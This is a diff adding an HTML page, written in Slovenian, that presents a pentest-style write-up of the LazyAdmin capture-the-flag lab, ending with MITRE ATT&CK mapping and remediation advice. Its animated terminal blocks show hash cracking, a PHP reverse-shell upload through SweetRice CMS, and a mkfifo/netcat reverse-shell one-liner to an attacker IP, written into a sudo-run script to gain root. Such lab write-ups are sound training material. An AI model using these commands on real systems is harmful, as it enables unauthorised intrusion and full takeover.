@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html lang="sl">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Attack Report | THM‑Project</title>
+  <link rel="stylesheet" href="style/style.css" />
+  <style>
+    .walkthrough-step {
+      background: rgba(0, 0, 0, 0.3);
+      border-left: 4px solid var(--accent-blue);
+      padding: 15px 20px;
+      margin: 20px 0;
+      border-radius: 0 8px 8px 0;
+    }
+    .walkthrough-step h3 {
+      margin-top: 0;
+      color: var(--accent-blue);
+    }
+    .walkthrough-step p {
+      margin-bottom: 10px;
+      line-height: 1.6;
+    }
+    .report-img {
+      max-width: 100%;
+      border: 1px solid rgba(51, 255, 153, 0.3);
+      border-radius: 5px;
+      margin: 10px 0 20px 0;
+      box-shadow: 0 4px 10px rgba(0,0,0,0.5);
+      transition: transform 0.3s ease;
+      display: block;
+    }
+    .report-img:hover {
+      transform: scale(1.02);
+      border-color: var(--accent-blue);
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">⚡ THM‑Project</div>
+    <nav>
+      <a href="index.html">Domov</a>
+      <a href="phases/reconnaissance.html">Faze&nbsp;napada</a>
+      <a href="tools/tools.html">Orodja</a>
+      <a href="report.html" class="active">Attack&nbsp;Report</a>
+      <a href="about.html">O&nbsp;avtorju</a>
+    </nav>
+  </header>
+
+  <section class="intro">
+    <button onclick="window.print()" class="button print-btn" style="float: right; margin-top: 5px; font-size: 0.9em; padding: 10px 15px;">🖨️ Prenesi v PDF</button>
+    <h1>Uradno varnostno poročilo (Attack Report)</h1>
+    <p style="clear: both;">
+      Ta dokument predstavlja povzetek ugotovitev penetracijskega testa na tarči <strong>LazyAdmin</strong>.
+      Namenjen je vodstvu in tehnični ekipi podjetja za razumevanje poslovnega tveganja in odpravo ranljivosti.
+    </p>
+
+    <h2>1. Povzetek za vodstvo (Executive Summary)</h2>
+    <p>
+      Med izvajanjem varnostnega preizkusa smo identificirali <strong>kritične ranljivosti</strong> v spletni aplikaciji in konfiguraciji strežnika, ki so napadalcu omogočile popoln prevzem nadzora nad sistemom. Z izkoriščanjem šibkosti pri preverjanju vnosov in napačno dodeljenimi privilegiji v operacijskem sistemu je bil vzpostavljen neavtoriziran skrbniški dostop.
+    </p>
+    
+    <h2>2. Ocena tveganja (CVSS 3.1 Kalkulator)</h2>
+    <div class="tools-grid">
+      <div class="tool-card" id="cvss-card" style="border-color: #ff3366; box-shadow: 0 0 15px rgba(255, 51, 102, 0.2); width: 100%; transition: all 0.3s ease;">
+        <h3 id="cvss-score-display" style="color: #ff3366; text-shadow: 0 0 10px rgba(255, 51, 102, 0.5); transition: color 0.3s ease;">Kritično tveganje (CVSS: 9.8)</h3>
+        <p>Interaktivni izračun tveganja za odkrito ranljivost (Spremeni nastavitve za live simulacijo izračuna):</p>
+        
+        <div style="display: flex; gap: 15px; flex-wrap: wrap; margin-top: 15px;">
+            <div style="flex: 1; min-width: 150px;">
+                <label style="display: block; font-size: 0.85em; color: var(--accent-blue); margin-bottom: 5px;">Vidik napada (Attack Vector)</label>
+                <select id="cvss-av" onchange="calcCVSS()" style="width: 100%; padding: 8px; background: rgba(0,0,0,0.5); color: var(--text-main); border: 1px solid rgba(51, 255, 153, 0.3); border-radius: 4px; font-family: monospace;">
+                    <option value="0.85" selected>Omrežje (Network)</option>
+                    <option value="0.62">Lokalno omrežje (Adjacent)</option>
+                    <option value="0.55">Lokalno (Local)</option>
+                </select>
+            </div>
+            <div style="flex: 1; min-width: 150px;">
+                <label style="display: block; font-size: 0.85em; color: var(--accent-blue); margin-bottom: 5px;">Potrebne pravice (Privileges)</label>
+                <select id="cvss-pr" onchange="calcCVSS()" style="width: 100%; padding: 8px; background: rgba(0,0,0,0.5); color: var(--text-main); border: 1px solid rgba(51, 255, 153, 0.3); border-radius: 4px; font-family: monospace;">
+                    <option value="0.85" selected>Brez (None)</option>
+                    <option value="0.62">Nizke (Low)</option>
+                    <option value="0.27">Visoke (High)</option>
+                </select>
+            </div>
+            <div style="flex: 1; min-width: 150px;">
+                <label style="display: block; font-size: 0.85em; color: var(--accent-blue); margin-bottom: 5px;">Interakcija uporabnika (UI)</label>
+                <select id="cvss-ui" onchange="calcCVSS()" style="width: 100%; padding: 8px; background: rgba(0,0,0,0.5); color: var(--text-main); border: 1px solid rgba(51, 255, 153, 0.3); border-radius: 4px; font-family: monospace;">
+                    <option value="0.85" selected>Ni potrebna (None)</option>
+                    <option value="0.62">Potrebna (Required)</option>
+                </select>
+            </div>
+        </div>
+
+        <script>
+            function calcCVSS() {
+                const av = parseFloat(document.getElementById('cvss-av').value);
+                const pr = parseFloat(document.getElementById('cvss-pr').value);
+                const ui = parseFloat(document.getElementById('cvss-ui').value);
+                
+                // Poenostavljen izračun CVSS v3 Base Score (Vpliv na sistem predpostavljamo kot zelo visok 6.42)
+                const impact = 6.42; 
+                const exploitability = 8.22 * av * 0.77 /* AC: Low */ * pr * ui;
+                
+                let score = Math.min((impact + exploitability), 10.0);
+                score = (Math.ceil(score * 10) / 10).toFixed(1);
+                
+                const display = document.getElementById('cvss-score-display');
+                const card = document.getElementById('cvss-card');
+                
+                let severity = "Kritično"; let color = "#ff3366";
+                if(score < 4.0) { severity = "Nizko"; color = "#27c93f"; }
+                else if(score < 7.0) { severity = "Srednje"; color = "#ffbd2e"; }
+                else if(score < 9.0) { severity = "Visoko"; color = "#ff9900"; }
+                
+                display.innerText = severity + " tveganje (CVSS: " + score + ")";
+                display.style.color = color;
+                display.style.textShadow = "0 0 10px " + color + "80";
+                card.style.borderColor = color;
+                card.style.boxShadow = "0 0 15px " + color + "33";
+            }
+        </script>
+      </div>
+    </div>
+
+    <h2>3. Podroben potek napada (Walkthrough)</h2>
+    <p>Spodaj je podroben opis korakov in tehnik, ki so bile uporabljene med penetracijskim testom za pridobitev začetnega dostopa in dviga privilegijev na nivo skrbnika (root).</p>
+
+    <div class="walkthrough-step">
+      <h3>Faza 1: Odkrivanje spleta in omrežja (Reconnaissance)</h3>
+      <p>Napad smo pričeli z osnovnim pregledom omrežja z orodjem <strong>Nmap</strong>, ki je razkrilo odprta priključka 22 (SSH) in 80 (HTTP).</p>
+      
+      <div class="terminal-window animated-terminal" data-lines='[
+          {"type": "input", "text": "nmap -sV -sC 10.10.x.x", "delayAfter": 800},
+          {"type": "output", "text": "Starting Nmap 7.92 ( https://nmap.org )\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu\n80/tcp open  http    Apache httpd 2.4.18", "delayAfter": 1000}
+      ]'>
+          <div class="terminal-header">
+              <div class="terminal-buttons">
+                  <div class="terminal-button close"></div>
+                  <div class="terminal-button minimize"></div>
+                  <div class="terminal-button maximize"></div>
+              </div>
+              <div class="terminal-title">root@kali: ~ (Nmap)</div>
+          </div>
+          <div class="terminal-body"></div>
+      </div>
+      <img src="assets/screenshoots/Nmap_resoults.png" alt="Nmap rezultat skeniranja" class="report-img">
+      
+      <p>Obisk priključka 80 nam najprej pokaže privzeto stran Apache2, kar potrdi, da spletni strežnik deluje.</p>
+      <img src="assets/screenshoots/apache2_def_page.png" alt="Privzeta stran Apache2" class="report-img">
+      
+      <p>Nato z uporabo orodja <strong>Gobuster</strong> in seznama pogostih besed poskeniramo skrite direktorije na spletni strani ter uspešno odkrijemo direktorij <code>/content/</code>.</p>
+      <div class="terminal-window animated-terminal" data-lines='[
+          {"type": "input", "text": "gobuster dir -u http://10.10.x.x -w common.txt", "delayAfter": 800},
+          {"type": "output", "text": "===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/content              (Status: 301) [Size: 316]", "delayAfter": 1000}
+      ]'>
+          <div class="terminal-header">
+              <div class="terminal-buttons">
+                  <div class="terminal-button close"></div>
+                  <div class="terminal-button minimize"></div>
+                  <div class="terminal-button maximize"></div>
+              </div>
+              <div class="terminal-title">root@kali: ~ (Gobuster)</div>
+          </div>
+          <div class="terminal-body"></div>
+      </div>
+      <img src="assets/screenshoots/gobuster_resoults_finding_content_folder.png" alt="Gobuster odkrije direktorij content" class="report-img">
+      
+      <p>S pregledom mape <code>/content/</code> odkrijemo nameščen CMS sistem po imenu SweetRice.</p>
+      <img src="assets/screenshoots/finding_content_folder_on_website.png" alt="SweetRice spletna stran" class="report-img">
+      
+      <p>Z dodatnim iskanjem (Gobuster) pridobimo seznam podmape in pomembne strukture znotraj same inštalacije SweetRice (vidimo potrditvene mape itd.).</p>
+      <div class="terminal-window animated-terminal" data-lines='[
+          {"type": "input", "text": "gobuster dir -u http://10.10.x.x/content/ -w common.txt", "delayAfter": 800},
+          {"type": "output", "text": "/inc                  (Status: 301)\n/as                   (Status: 301)\n/images               (Status: 301)", "delayAfter": 1000}
+      ]'>
+          <div class="terminal-header">
+              <div class="terminal-buttons">
+                  <div class="terminal-button close"></div>
+                  <div class="terminal-button minimize"></div>
+                  <div class="terminal-button maximize"></div>
+              </div>
+              <div class="terminal-title">root@kali: ~ (Gobuster Content)</div>
+          </div>
+          <div class="terminal-body"></div>
+      </div>
+      <img src="assets/screenshoots/gobuster_resoults_finding_dirs_in_content.png" alt="Gobuster iskanje po podmapah" class="report-img">
+    </div>
+
+    <div class="walkthrough-step">
+      <h3>Faza 2: Iskanje občutljivih podatkov in ranljivosti</h3>
+      <p>Pregledamo zgradbo datotek in v poddirektoriju <code>/inc/</code> med datotekami najdemo mapo z varnostnimi kopijami podatkovne baze: <code>mysql_backup</code>.</p>
+      <img src="assets/screenshoots/content_inc_webpage.png" alt="Vsebina inc direktorija" class="report-img">
+      <img src="assets/screenshoots/content_inc_mysql_backup_webpage.png" alt="Direktorij MySQL backup" class="report-img">
+      
+      <p>Znotraj <code>.sql</code> datoteke najdemo preteklo varnostno kopijo, ki med drugim vsebuje uporabniško ime (manager) in zgoščeno obliko (MD5 hash) gesla za administracijo.</p>
+      <img src="assets/screenshoots/finding_creds_in_backup_file.png" alt="Odkritje gesel v backup datoteki" class="report-img">
+      
+      <p>Da bi lahko te poverilnice uporabili, uporabimo orodje <strong>Hashcat</strong>, s katerim MD5 zgoščeno vrednost uspešno razbijemo in pridobimo prosto geslo (Password123).</p>
+      <div class="terminal-window animated-terminal" data-lines='[
+          {"type": "input", "text": "hashcat -m 0 hash.txt rockyou.txt", "delayAfter": 800},
+          {"type": "output", "text": "103a...:Password123\n\nSession..........: hashcat\nStatus...........: Cracked", "delayAfter": 1000}
+      ]'>
+          <div class="terminal-header">
+              <div class="terminal-buttons">
+                  <div class="terminal-button close"></div>
+                  <div class="terminal-button minimize"></div>
+                  <div class="terminal-button maximize"></div>
+              </div>
+              <div class="terminal-title">root@kali: ~ (Hashcat)</div>
+          </div>
+          <div class="terminal-body"></div>
+      </div>
+      <img src="assets/screenshoots/running_hashcat_for_md5_hash.png" alt="Uporaba Hashcat orodja" class="report-img">
+    </div>
+
+    <div class="walkthrough-step">
+      <h3>Faza 3: Začetni dostop (Initial Access)</h3>
+      <p>Podatke vnesemo v prijavno okno na administratorskem panelu nadzornega sistema SweetRice (direktorij <code>/as/</code>).</p>
+      <img src="assets/screenshoots/loggin_in_dir_as_loginpage_with_credidentails.png" alt="Prijava z gesli" class="report-img">
+      
+      <p>Sočasno poiščemo javno znane ranljivosti za sistem preko orodja <strong>SearchSploit</strong> in ugotovimo, da določena verzija SweetRice dovoljuje nalaganje ter izvajanje poljubnih datotek (Arbitrary File Upload).</p>
+      <div class="terminal-window animated-terminal" data-lines='[
+          {"type": "input", "text": "searchsploit sweetrice", "delayAfter": 800},
+          {"type": "output", "text": "---------------------------------------- -------------------------\n Exploit Title                          |  Path\n---------------------------------------- -------------------------\nSweetRice 1.5.1 - Arbitrary File Upload | php/webapps/40716.py\n---------------------------------------- -------------------------", "delayAfter": 1000}
+      ]'>
+          <div class="terminal-header">
+              <div class="terminal-buttons">
+                  <div class="terminal-button close"></div>
+                  <div class="terminal-button minimize"></div>
+                  <div class="terminal-button maximize"></div>
+              </div>
+              <div class="terminal-title">root@kali: ~ (Searchsploit)</div>
+          </div>
+          <div class="terminal-body"></div>
+      </div>
+      <img src="assets/screenshoots/searchsploit_sweetrice_resoults.png" alt="SearchSploit rezultati za Sweetrice ranljivosti" class="report-img">
+      
+      <p>Z orodjem zgeneriramo (ali prenesemo) preprost <strong>PHP Reverse Shell</strong> skript.</p>
+      <img src="assets/screenshoots/using_revshell_generator_for_php_revshell.png" alt="Generator za PHP Reverse Shell" class="report-img">
+      
+      <p>V administraciji portala odpremo razdelek 'Ads' (Oglasi) in tja naložimo ali prilepimo skripto kot novo datoteko.</p>
+      <img src="assets/screenshoots/adding_revshell_into_ads_on_dahsboard.png" alt="Vstavljanje Reverse Shell-a v oglase" class="report-img">
+      
+      <p>V lokalnem terminalnem oknu sprožimo orodje <strong>Netcat</strong> na izbranih vratih, s katerim pričakujemo povratno povezavo.</p>
+      <div class="terminal-window animated-terminal" data-lines='[
+          {"type": "input", "text": "nc -lvnp 1234", "delayAfter": 800},
+          {"type": "output", "text": "listening on [any] 1234 ...", "delayAfter": 1000}
+      ]'>
+          <div class="terminal-header">
+              <div class="terminal-buttons">
+                  <div class="terminal-button close"></div>
+                  <div class="terminal-button minimize"></div>
+                  <div class="terminal-button maximize"></div>
+              </div>
+              <div class="terminal-title">root@kali: ~ (Netcat Listener 1)</div>
+          </div>
+          <div class="terminal-body"></div>
+      </div>
+      <img src="assets/screenshoots/preparing_nc_for_revshell.png" alt="Priprava poslušalca v Netcat" class="report-img">
+      
+      <p>Na strani spletne aplikacije odpremo povezavo do ustvarjenega PHP oglasa za aktivacijo skripte.</p>
+      <img src="assets/screenshoots/accesing_ads_to_activate_revshell.png" alt="Sprožitev naložene datoteke" class="report-img">
+      
+      <p>Takoj po nalaganju skripte prejmemo povratno povezavo v Netcat konzoli - nad platformo imamo nadzor s pravicami strežnika (kot uporabnik <code>www-data</code>).</p>
+      <div class="terminal-window animated-terminal" data-lines='[
+          {"type": "output", "text": "connect to [10.14.x.x] from (UNKNOWN) [10.10.x.x] 49302", "delayAfter": 500},
+          {"type": "input", "text": "id", "delayAfter": 800},
+          {"type": "output", "text": "uid=33(www-data) gid=33(www-data) groups=33(www-data)", "delayAfter": 1000}
+      ]'>
+          <div class="terminal-header">
+              <div class="terminal-buttons">
+                  <div class="terminal-button close"></div>
+                  <div class="terminal-button minimize"></div>
+                  <div class="terminal-button maximize"></div>
+              </div>
+              <div class="terminal-title">root@kali: ~ (Netcat Session)</div>
+          </div>
+          <div class="terminal-body"></div>
+      </div>
+      <img src="assets/screenshoots/getting_rev_shell.png" alt="Dobimo prvi (www-data) reverse shell" class="report-img">
+    </div>
+
+    <div class="walkthrough-step">
+      <h3>Faza 4: Dvig privilegijev do skrbnika (Privilege Escalation)</h3>
+      <p>Za pridobitev popolnega (Root) dostopa najprej preverimo <code>sudo</code> pravice z uporabo naprave. Uporabimo ukaz <code>sudo -l</code> in razberemo, da lahko brez Root gesla zaženemo skripto <code>/home/itguy/backup.pl</code>.</p>
+      <div class="terminal-window animated-terminal" data-lines='[
+          {"type": "input", "text": "sudo -l", "delayAfter": 800},
+          {"type": "output", "text": "User www-data may run the following commands on THM-LazyAdmin:\n    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl", "delayAfter": 1000}
+      ]'>
+          <div class="terminal-header">
+              <div class="terminal-buttons">
+                  <div class="terminal-button close"></div>
+                  <div class="terminal-button minimize"></div>
+                  <div class="terminal-button maximize"></div>
+              </div>
+              <div class="terminal-title">www-data@LazyAdmin: ~ (Sudo Check)</div>
+          </div>
+          <div class="terminal-body"></div>
+      </div>
+      <img src="assets/screenshoots/running_sudo-l.png" alt="Sudo -l pravice" class="report-img">
+      
+      <p>Pregledamo vsebino tega perl skripta, kjer je nakazano, da ta izvede drugo bash in sistemsko skripto <code>/etc/copy.sh</code>.</p>
+      <div class="terminal-window animated-terminal" data-lines='[
+          {"type": "input", "text": "cat /home/itguy/backup.pl", "delayAfter": 800},
+          {"type": "output", "text": "system(\"sh\", \"/etc/copy.sh\");", "delayAfter": 1000},
+          {"type": "input", "text": "cat /etc/copy.sh", "delayAfter": 800},
+          {"type": "output", "text": "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.1.55 5555 >/tmp/f", "delayAfter": 1000}
+      ]'>
+          <div class="terminal-header">
+              <div class="terminal-buttons">
+                  <div class="terminal-button close"></div>
+                  <div class="terminal-button minimize"></div>
+                  <div class="terminal-button maximize"></div>
+              </div>
+              <div class="terminal-title">www-data@LazyAdmin: ~ (File Eval)</div>
+          </div>
+          <div class="terminal-body"></div>
+      </div>
+      <img src="assets/screenshoots/nano_mysqlbackup_resoults.png" alt="Pregled perl backup skripte" class="report-img">
+      <img src="assets/screenshoots/runnin_cat_etc_copy_dot_sh.png" alt="Vsebina datoteke copy.sh" class="report-img">
+      
+      <p>Ker imamo dostop za modificiranje datoteke <code>/etc/copy.sh</code>, z ukazom podtaknemo nov povratni klic (Reverse shell). Ko se datoteka izvede v Root imenu, vzpostavi Root povezavo nazaj na naš napadalni stroj.</p>
+      <div class="terminal-window animated-terminal" data-lines='[
+          {"type": "input", "text": "echo \"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.x.x 5555 >/tmp/f\" > /etc/copy.sh", "delayAfter": 800},
+          {"type": "output", "text": "", "delayAfter": 200}
+      ]'>
+          <div class="terminal-header">
+              <div class="terminal-buttons">
+                  <div class="terminal-button close"></div>
+                  <div class="terminal-button minimize"></div>
+                  <div class="terminal-button maximize"></div>
+              </div>
+              <div class="terminal-title">www-data@LazyAdmin: ~ (Exploit Modify)</div>
+          </div>
+          <div class="terminal-body"></div>
+      </div>
+      <img src="assets/screenshoots/running_echo_comand_for_getting_second_revshell_with_root.png" alt="Kopiranje reverse shell ukaza v datoteko" class="report-img">
+      
+      <p>Odpremo in priklopimo še en <strong>Netcat</strong> poslušalec za sprejem te povezave.</p>
+      <div class="terminal-window animated-terminal" data-lines='[
+          {"type": "input", "text": "nc -lvnp 5555", "delayAfter": 800},
+          {"type": "output", "text": "listening on [any] 5555 ...", "delayAfter": 1000}
+      ]'>
+          <div class="terminal-header">
+              <div class="terminal-buttons">
+                  <div class="terminal-button close"></div>
+                  <div class="terminal-button minimize"></div>
+                  <div class="terminal-button maximize"></div>
+              </div>
+              <div class="terminal-title">root@kali: ~ (Netcat Listener 2)</div>
+          </div>
+          <div class="terminal-body"></div>
+      </div>
+      <img src="assets/screenshoots/preparinf_second_nc_listener_for_priv_ex.png" alt="Drugi Netcat poslušalec" class="report-img">
+      
+      <p>Nato ročno z uporabo dodeljenih sudo privilegijev zaženemo ranljivo Perl skripto in s tem verižno sprožimo naš payload (copy.sh).</p>
+      <div class="terminal-window animated-terminal" data-lines='[
+          {"type": "input", "text": "sudo /usr/bin/perl /home/itguy/backup.pl", "delayAfter": 1000}
+      ]'>
+          <div class="terminal-header">
+              <div class="terminal-buttons">
+                  <div class="terminal-button close"></div>
+                  <div class="terminal-button minimize"></div>
+                  <div class="terminal-button maximize"></div>
+              </div>
+              <div class="terminal-title">www-data@LazyAdmin: ~ (Run Sudo)</div>
+          </div>
+          <div class="terminal-body"></div>
+      </div>
+      <img src="assets/screenshoots/running_vulnrable_sudo_file_for_second_listener.png" alt="Izvedba Perl datoteke z sudo pravicami" class="report-img">
+      
+      <p>In uspeh: Drugi poslušalec uspešno prejme povezavo kot najvišji strojni uporabnik (Root). Penetracijski test je uspešno zaključen in sistem v celoti osvojen.</p>
+      <div class="terminal-window animated-terminal" data-lines='[
+          {"type": "output", "text": "connect to [10.14.x.x] from (UNKNOWN) [10.10.x.x] 50132", "delayAfter": 500},
+          {"type": "input", "text": "id", "delayAfter": 800},
+          {"type": "output", "text": "uid=0(root) gid=0(root) groups=0(root)", "delayAfter": 1000}
+      ]'>
+          <div class="terminal-header">
+              <div class="terminal-buttons">
+                  <div class="terminal-button close"></div>
+                  <div class="terminal-button minimize"></div>
+                  <div class="terminal-button maximize"></div>
+              </div>
+              <div class="terminal-title">root@kali: ~ (Root Session)</div>
+          </div>
+          <div class="terminal-body"></div>
+      </div>
+      <img src="assets/screenshoots/getting_root_revshell_from_second_listener.png" alt="Pridobitev Root dostopa na sistemu" class="report-img">
+    </div>
+
+    <h2>4. Ključne ugotovitve in MITRE ATT&CK preslikava</h2>
+    <p>Spodaj je preslikava odkritih ranljivosti na industrijski standard MITRE ATT&CK, ki opisuje globalne taktike in tehnike napadalcev:</p>
+    <ul>
+      <li><strong>T1595.002 (Active Scanning):</strong> Skeniranje omrežja in iskanje odprtih portov ter skritih direktorijev z orodji podjetja (uporaba <em>Nmap</em> in <em>Gobuster</em>).</li>
+      <li><strong>T1505.003 (Web Shell):</strong> Zloraba zastarele različice SweetRice CMS sistema za prenos zlonamerne datoteke - Arbitrary File Upload (vstavitev v <em>Ads</em>).</li>
+      <li><strong>T1059.004 (Unix Shell):</strong> Pridobitev povratne povezave (Reverse Shell) in dostopa do strežnika s pomočjo ukaza Netcat znotraj ranljive skripte.</li>
+      <li><strong>T1548.003 (Sudo and Sudo Caching):</strong> Napačne <code>sudo</code> pravice, ki ob izvajanju Perl skripte (<code>backup.pl</code>) prožijo sistemsko zapisljivo datoteko <code>/etc/copy.sh</code>, in s tem omogočijo dvig pravic na najvišjo raven (root).</li>
+    </ul>
+
+    <h2>5. Priporočila za odpravo (Remediation)</h2>
+    <p>
+      Izvedba naslednjih korakov je ključna za zagotavljanje varnosti infrastrukture pred zunanjimi in notranjimi grožnjami:
+    </p>
+    <pre><code>
+# 1. Posodobitev sistemov in preprečitev datotečnih nalaganj na CMS (ali zamenjava CMS)
+apt-get update && apt-get upgrade -y
+
+# 2. Namestitev in konfiguracija požarnega zidu (UFW)
+ufw allow OpenSSH
+ufw enable
+
+# 3. Pregled sudo konfiguracije in brisanje nepotrebnih pravic
+# Urejanje /etc/sudoers (visudo) in odstranitev NOPASSWD določila za itguy
+    </code></pre>
+
+    <div class="note">
+      <p>Varnost je kontinuiran proces. Priporočamo redno izvajanje varnostnih pregledov, posodobitve ranljivih rešitev kot je odprtokodni sistem ter odstranjevanje odvečnih in napačno strukturiranih pravic lokalnih uporabnikov na sistemu.</p>
+    </div>
+
+    <div class="nav-buttons" style="margin-top: 30px;">
+      <a href="index.html" class="button">🏠 Domov</a>
+    </div>
+  </section>
+
+  <footer>
+    <p>&copy; 2024 Denis Pilipovic | THM Project | Attack Report</p>
+  </footer>
+  <script src="style/terminal.js"></script>
+  <script src="style/hacker.js"></script>
+</body>
+</html>
